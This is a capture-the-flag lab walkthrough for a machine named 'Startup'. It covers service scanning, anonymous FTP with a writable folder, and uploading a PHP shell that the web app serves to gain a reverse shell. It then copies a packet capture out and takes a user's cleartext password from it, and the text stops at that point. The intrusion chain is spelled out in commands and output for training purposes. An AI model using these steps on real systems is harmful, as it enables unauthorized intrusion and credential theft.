# Startup
Abuse traditional vulnerabilities via untraditional means.

---

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

---

## Resolution

Let's start with a version and script scan against the target machine
```
$ sudo nmap -sV -sC <machine_ip> -Pn -n

Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 22:53 CET
Nmap scan report for <machine_ip>
Host is up (0.038s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to <machine_ip>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The default `nmap` scripts were able to connect anonymously to the FTP server.
We can connect and `get` the files there.
```
$ ftp anonymous@<machine_ip>

Connected to <machine_ip>.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34705|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

Content of notice.txt
```
$ cat notice.txt
 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

The meme they're talking about is `important.jpg`:
![important](https://github.com/elomarii/CTF_4_DAY/assets/106914699/9b8c7cb6-ff1b-491c-98d3-14e77a032c67)

Web app fuzzing:
```
$ ffuf -w ~/Downloads/common.txt:FUZZ -u http://<machine_ip>/FUZZ 

<...snip...>
files                   [Status: 301, Size: 310, Words: 20, Lines: 10]
```

The `/files` path allows us to access the files on the FTP server.
This means that we can upload our shell to the server and then include it from the web app to achieve RCE.
Note that uploading the file to the main directory will not succeed. This is possible, however, in the `ftp` folder.

```
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||21801|)
553 Could not create file.

ftp> cd ftp
250 Directory successfully changed.

ftp> put shell.php 
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||22501|)
150 Ok to send data.
100% |*************************************************|   732        9.06 MiB/s    00:00 ETA
226 Transfer complete.
732 bytes sent in 00:00 (8.78 KiB/s)
```

You can use whatever php script you like to get a reverse shell back to your machine.\
Now that we have access to the machine, we find the recipe in the root directory:
```
www-data@startup:/$ cat recipe.txt

Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was <flag>.
```

Navigating to the home directory, we found the home folder of the user *lennie* but we don't have permission to access it.
Back to the root folder, we notice a suspicious folder `incidents` containing a suspicious `pcap` file:
```
www-data@startup:/incidents$ ls -l

-rwxr-xr-x 1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```

To get this file, we can copy it to the location of our FTP server and then download it on our local machine.
```
www-data@startup:/$ cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
```
![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/ec9272e5-6970-440f-b838-88c0d1db05d8)


Opening the capture in Wireshark and looking at the statistics, we notice that the before-last communication is the one that produces most of the traffic.
We apply the IP addresses as filters and then we follow the TCP stream to see what has been exchanged in the communication.

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/a9ed5665-1058-4c64-aac2-fd3c151b4659)

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/b6ac0d9e-6c73-4e73-a9d7-94bccb69b2ff)

The capture catches a connection of a user *vagrant* using a reverse shell the same way we did to get access to the machine. *vagrant* tried to access *lennie*'s home directory unsuccessfully and then tried to list files that can be run as root without the need for a password.
What's interesting is the password *vagrant* used in the process: `c4ntg3t3n0ughsp1c3`. This can be the password of someone else. Luckily this is the password of *lennie*.




